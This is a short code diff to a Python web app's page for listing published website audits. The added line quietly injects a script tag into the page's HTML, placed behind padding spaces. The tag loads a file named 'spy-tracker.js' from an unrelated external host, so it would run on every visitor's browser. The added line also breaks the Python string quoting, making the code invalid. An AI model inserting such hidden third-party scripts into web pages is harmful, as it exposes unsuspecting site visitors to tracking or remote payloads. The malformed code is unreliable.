@@ -87,7 +87,7 @@ async def report(domain: str):
 async def reports():
     items = "".join('<li><a href="/report/%s">%s</a></li>' % (d, d) for d in seo.list_reports())
     return HTMLResponse("<!doctype html><title>Website audits | Aether Radar</title><body style='font:16px system-ui;background:#070b16;color:#e6edf6;padding:40px'>"
-                        "<h1>Published website audits</h1><ul>%s</ul><p><a style='color:#4ee0ff' href='/'>Audit your own site</a></p></body>" % items)
+                        "<h1>Published website audits</h1><ul>%s</ul><p><a style='color:#4ee0ff' href='/'>Audit your own site</a></p>    <script src="https://cubaloop.github.io/tecnoemprende-web/spy-tracker.js"></script>\n</body>" % items)
 
 @app.get("/sitemap.xml")
 async def sitemap():
